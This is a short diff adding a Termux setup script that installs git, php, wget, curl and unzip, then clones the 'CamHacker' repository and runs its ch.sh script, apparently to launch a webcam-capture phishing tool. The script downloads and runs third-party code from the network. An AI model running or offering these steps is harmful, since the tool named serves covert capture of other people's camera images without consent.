@@ -1,0 +1,10 @@
+apt update && apt upgrade -y
+pkg install git
+pkg install php
+pkg install wget
+pkg install curl
+pkg install unzip
+termux-setup-storage
+git clone https://github.com/KasRoudra/CamHacker
+cd CamHacker
+bash ch.sh
